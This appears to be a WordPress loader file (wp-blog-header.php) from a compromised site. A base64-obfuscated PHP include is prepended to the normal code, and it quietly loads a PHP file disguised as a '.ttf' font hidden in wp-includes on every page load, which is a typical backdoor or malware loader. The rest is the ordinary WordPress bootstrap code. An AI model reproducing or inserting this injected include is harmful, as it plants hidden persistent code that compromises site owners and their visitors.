<?php @include base64_decode("L3Zhci93d3cvc2ltb25uZWVsbGVfZGUvd29yZHByZXNzL3dwLWluY2x1ZGVzL1RleHQvRGlmZi9FbmdpbmUvbnBvcW5wc3FxcHAudHRm");?><?php
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */

if ( ! isset( $wp_did_header ) ) {

	$wp_did_header = true;

	// Load the WordPress library.
	require_once __DIR__ . '/wp-load.php';

	// Set up the WordPress query.
	wp();

	// Load the theme template.
	require_once ABSPATH . WPINC . '/template-loader.php';

}
